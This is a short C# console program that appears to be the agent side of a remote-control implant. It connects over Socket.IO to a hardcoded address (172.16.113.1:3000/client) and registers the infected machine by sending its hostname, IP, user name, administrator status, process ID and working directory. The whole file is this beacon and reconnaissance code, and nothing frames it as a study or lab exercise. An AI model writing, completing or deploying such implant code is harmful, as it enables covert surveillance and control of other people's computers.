using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SocketIOClient;
using System.Net;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                Go(args[0]);
            }
            else
            {
                Go();
            }
            while (true) { };
        }
        static async void Go(string home = "http://172.16.113.1:3000/client")
        {
            var client = new SocketIO(home);
            await client.ConnectAsync();
            client.OnConnected += (sender, e) =>
            {
                client.EmitAsync("register", GetSysinfo());
            };
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());

            var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);

            return ip != null ? ip.ToString() : "0.0.0.0";
        }
        private static bool AmIHigh()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static object GetSysinfo()
        {
            string id = Guid.NewGuid().ToString();
            string hostname = Environment.MachineName;
            string ipaddr = GetLocalIPAddress();
            string elevated = AmIHigh() ? "*" : "";
            string username = elevated + WindowsIdentity.GetCurrent().Name;
            string pid = Process.GetCurrentProcess().Id.ToString();
            string process = Process.GetCurrentProcess().ProcessName;
            string pwd = Directory.GetCurrentDirectory();

            return new { id, hostname, ipaddr, username, pid, process, pwd };
        }
    }
}
